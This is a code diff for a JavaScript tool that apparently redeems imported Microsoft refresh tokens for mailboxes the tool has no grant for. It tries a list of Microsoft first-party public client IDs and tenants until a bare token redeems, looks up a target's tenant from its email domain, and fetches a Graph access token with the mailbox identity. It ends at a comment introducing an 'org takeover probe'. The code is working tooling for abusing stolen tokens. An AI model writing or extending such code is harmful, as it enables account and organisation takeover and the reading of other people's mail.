@@ -551,9 +551,25 @@ async function gmailAccessToken(settings) {
 }
 
 // ── Per-mailbox MS refresh-token auth (imported RT mailboxes) ──────
-async function msRtAccessToken(clientId, refreshToken, tenant = 'common') {
-  const key = `msrt:${clientId}:${createHash('sha256').update(refreshToken).digest('hex').slice(0, 16)}`;
-  if (tokenCache[key]?.exp > Date.now()) return tokenCache[key].token;
+// Public first-party clients an ordinary "1.xxx" refresh token may belong to.
+// A bare token has no client id inside it, so try the common ones until one
+// redeems; the winner is remembered on the account for later refreshes.
+export const MS_RT_PUBLIC_CLIENTS = [
+  '29d9ed98-a469-4536-ade2-f981bc1d605e', // Microsoft Authentication Broker (WAM)
+  'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Microsoft Office
+  '9e5f94bc-e8a4-4e73-b8be-63364c29d753', // Microsoft Office (legacy)
+  '27922004-5251-4030-b22d-91ecd9a37ea4', // Outlook Mobile
+  '9199bf20-a13f-4107-85dc-02114787ef48', // Outlook Web
+  '1fec8e78-bce4-4aaf-ab1b-5451cc387264', // Microsoft Teams (desktop)
+  '5e3ce6c0-2b1f-4285-8d4b-75ee78787346', // Microsoft Teams (web)
+  '04b07795-8ddb-461a-bbee-02f9e1bf7b46', // Azure CLI
+  '1b730954-1685-4b74-9bfd-dac224a7b894', // Azure AD PowerShell
+  '14d82eec-204b-4c2f-b7e8-296a70dab67e', // Microsoft Graph PowerShell
+  '00000003-0000-0000-c000-000000000000', // Microsoft Graph
+  '802cdc8f-1d39-4037-b5ef-997f31eaa71b', // Microsoft Teams (public)
+];
+
+async function msRtRedeem(clientId, refreshToken, tenant) {
   const body = {
     client_id: clientId,
     refresh_token: refreshToken,
@@ -564,6 +580,7 @@ async function msRtAccessToken(clientId, refreshToken, tenant = 'common') {
     method: 'POST',
     headers: { 'content-type': 'application/x-www-form-urlencoded' },
     body: new URLSearchParams(body),
+    signal: AbortSignal.timeout(15000),
   });
   let res = await post();
   let data = await res.json().catch(() => ({}));
@@ -573,15 +590,73 @@ async function msRtAccessToken(clientId, refreshToken, tenant = 'common') {
     res = await post();
     data = await res.json().catch(() => ({}));
   }
-  if (!res.ok) {
-    const detail = String(data.error_description || data.error || res.status);
-    if (/AADSTS50173|AADSTS700082|invalid_grant|revoked|expired/i.test(detail)) {
-      throw Object.assign(new Error(`MS RT token revoked or expired — re-import a fresh refresh token for this mailbox. (${detail.split('.')[0]})`), { code: 'REAUTH' });
-    }
-    throw new Error(`MS RT token failed: ${detail}`);
+  return { ok: res.ok, data, detail: String(data.error_description || data.error || res.status) };
+}
+
+function msRtError(detail) {
+  if (/AADSTS50173|AADSTS700082|invalid_grant|revoked|expired/i.test(detail)) {
+    return Object.assign(new Error(`MS RT token revoked or expired — re-import a fresh refresh token for this mailbox. (${detail.split('.')[0]})`), { code: 'REAUTH' });
   }
-  tokenCache[key] = { token: data.access_token, exp: Date.now() + (Number(data.expires_in) - 60) * 1000 };
-  return tokenCache[key].token;
+  if (/AADSTS9002313|AADSTS7000012/i.test(detail)) {
+    return Object.assign(new Error(`MS RT token needs its tenant or client id — import it as email:client_id:rt (or add the mailbox email) so it can be redeemed. (${detail.split('.')[0]})`), { code: 'NEEDS_TENANT' });
+  }
+  return new Error(`MS RT token failed: ${detail}`);
+}
+
+async function msRtAccessInfo(clientId, refreshToken, tenant = 'common') {
+  const key = `msrt:${clientId || 'probe'}:${createHash('sha256').update(refreshToken).digest('hex').slice(0, 16)}`;
+  if (tokenCache[key]?.exp > Date.now()) return tokenCache[key];
+  const ids = (Array.isArray(clientId) ? clientId : [clientId]).filter(Boolean);
+  const list = ids.length ? ids : MS_RT_PUBLIC_CLIENTS;
+  const tenants = [...new Set([tenant || 'common', 'common', 'organizations', 'consumers'])];
+  let lastDetail = '';
+  for (const id of list) {
+    for (const t of tenants) {
+      const r = await msRtRedeem(id, refreshToken, t);
+      if (r.ok) {
+        tokenCache[key] = {
+          token: r.data.access_token,
+          exp: Date.now() + (Number(r.data.expires_in) - 60) * 1000,
+          clientId: id,
+          tenant: t,
+        };
+        return tokenCache[key];
+      }
+      lastDetail = r.detail;
+      // A definite auth verdict does not improve by trying another client.
+      if (/AADSTS50173|AADSTS700082|invalid_grant|revoked|expired/i.test(lastDetail)) throw msRtError(lastDetail);
+    }
+  }
+  throw msRtError(lastDetail);
+}
+
+async function msRtAccessToken(clientId, refreshToken, tenant = 'common') {
+  const info = await msRtAccessInfo(clientId, refreshToken, tenant);
+  return info.token;
+}
+
+// Resolve a tenant id from a mailbox address so a bare "1.xxx" RT can be
+// redeemed against the right directory.
+export async function msTenantFromEmail(email) {
+  const domain = String(email || '').split('@')[1]?.trim().toLowerCase();
+  if (!domain) return '';
+  try {
+    const res = await fetch(`https://login.microsoftonline.com/${encodeURIComponent(domain)}/v2.0/.well-known/openid-configuration`, { signal: AbortSignal.timeout(10000) });
+    if (res.ok) {
+      const j = await res.json().catch(() => ({}));
+      const tid = String(j.issuer || '').split('/')[3] || '';
+      if (/^[0-9a-f-]{36}$/i.test(tid)) return tid;
+    }
+  } catch {}
+  try {
+    const res = await fetch(`https://login.microsoftonline.com/getuserrealm.srf?login=${encodeURIComponent(email)}&json=1`, { signal: AbortSignal.timeout(10000) });
+    if (res.ok) {
+      const j = await res.json().catch(() => ({}));
+      const tid = String(j.AuthURL || j.FederationMetadataUrl || '').match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i)?.[0] || '';
+      if (tid) return tid;
+    }
+  } catch {}
+  return '';
 }
 
 // App-credentials (client_id + client_secret + tenant) — app-level token, .default scope.
@@ -644,15 +719,21 @@ export async function msCcListMailboxes(clientId, clientSecret, tenant) {
 }
 
 export async function msRtMailboxInfo(clientId, refreshToken, tenant = 'common') {
-  const token = await msRtAccessToken(clientId, refreshToken, tenant);
+  const access = await msRtAccessInfo(clientId, refreshToken, tenant);
   const res = await fetch('https://graph.microsoft.com/v1.0/me?$select=mail,userPrincipalName,displayName', {
-    headers: { authorization: `Bearer ${token}` },
+    headers: { authorization: `Bearer ${access.token}` },
     signal: AbortSignal.timeout(15000),
   });
   const data = await res.json().catch(() => ({}));
   if (!res.ok) throw new Error(`MS RT mailbox lookup failed ${res.status}: ${data.error?.message || res.statusText}`);
   const email = data.mail || data.userPrincipalName || '';
-  return { email, displayName: data.displayName || email, token };
+  return {
+    email,
+    displayName: data.displayName || email,
+    token: access.token,
+    clientId: access.clientId,
+    tenant: access.tenant,
+  };
 }
 
 // Org takeover probe — a delegated token that can read the directory is an
